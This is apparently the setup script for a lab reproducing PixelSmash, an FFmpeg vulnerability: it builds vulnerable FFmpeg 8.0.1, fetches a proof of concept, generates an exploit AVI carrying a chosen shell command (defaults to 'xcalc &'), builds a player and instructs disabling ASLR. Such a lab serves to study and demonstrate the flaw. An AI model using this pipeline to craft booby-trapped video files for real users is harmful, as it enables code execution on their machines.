#!/usr/bin/env bash
#
# setup.sh
#
# Runs the full PixelSmash (CVE-2026-8461) lab setup:
#   1. Build vulnerable FFmpeg 8.0.1 and clone the PoC   (lab/setup_lab.sh)
#   2. Generate the xcalc exploit AVI                    (lab/prepare_payload.sh)
#   3. Build the Qt player                               (player/compile.sh)
#
# Usage:
#   ./setup.sh              # full run
#   ./setup.sh --skip-build # skip FFmpeg build (already done)
#   ./setup.sh --skip-player # skip player build
#   ./setup.sh --payload "id > /tmp/pwned"
#
# Run from the repo root. Requires sudo for step 1.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ---------------------------------------------------------------------------
# Options
# ---------------------------------------------------------------------------

SKIP_BUILD=0
SKIP_PLAYER=0
PAYLOAD="xcalc &"

while [ $# -gt 0 ]; do
    case "$1" in
        --skip-build)  SKIP_BUILD=1;  shift ;;
        --skip-player) SKIP_PLAYER=1; shift ;;
        --payload)     PAYLOAD="$2"; shift 2 ;;
        -h|--help)
            sed -n '2,20p' "$0"
            exit 0
            ;;
        *)
            echo "Unknown option: $1" >&2
            exit 1
            ;;
    esac
done

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

info() { echo -e "\n\033[1;34m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
die()  { echo -e "\033[1;31m[✗]\033[0m $*" >&2; exit 1; }

# ---------------------------------------------------------------------------
# Make scripts executable
# ---------------------------------------------------------------------------

info "Setting executable bits..."
chmod +x lab/setup_lab.sh
chmod +x lab/prepare_payload.sh
chmod +x player/compile.sh
ok "Scripts are executable."

# ---------------------------------------------------------------------------
# Step 1 — Build FFmpeg + clone PoC
# ---------------------------------------------------------------------------

if [ "$SKIP_BUILD" -eq 1 ]; then
    info "Skipping FFmpeg build (--skip-build)."
else
    info "Step 1/3: building vulnerable FFmpeg 8.0.1..."
    sudo lab/setup_lab.sh
    ok "Step 1 complete."
fi

# ---------------------------------------------------------------------------
# Step 2 — Generate the exploit AVI
# ---------------------------------------------------------------------------

info "Step 2/3: generating exploit AVI with payload: $PAYLOAD"
lab/prepare_payload.sh "$PAYLOAD"
ok "Step 2 complete."

# ---------------------------------------------------------------------------
# Step 3 — Build the Qt player
# ---------------------------------------------------------------------------

if [ "$SKIP_PLAYER" -eq 1 ]; then
    info "Skipping player build (--skip-player)."
else
    info "Step 3/3: building Qt player..."

    # Install Qt5 dev packages if missing.
    if ! dpkg -s qtbase5-dev >/dev/null 2>&1; then
        info "Installing qtbase5-dev..."
        sudo apt install -y qtbase5-dev qt5-qmake
    fi

    player/compile.sh
    ok "Step 3 complete."
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

cat <<EOF

============================================================
  Setup complete.
============================================================

  Vulnerable FFmpeg:  /usr/local/bin/ffmpeg
  PoC:                $SCRIPT_DIR/exploit/
  Player binary:      $SCRIPT_DIR/player/build/ffplayer
  AVIs:               $SCRIPT_DIR/lab/vids/

Before running the demo, disable ASLR:

    sudo sysctl -w kernel.randomize_va_space=0

Then run the player:

    $SCRIPT_DIR/player/build/ffplayer

Open the AVI generated in this run:

    $SCRIPT_DIR/lab/vids/$(basename "$(ls -t "$SCRIPT_DIR/lab/vids"/*.avi 2>/dev/null | head -1)" 2>/dev/null || echo "<none>")

To regenerate with a different payload:

    lab/prepare_payload.sh "id > /tmp/pwned"

============================================================
EOF
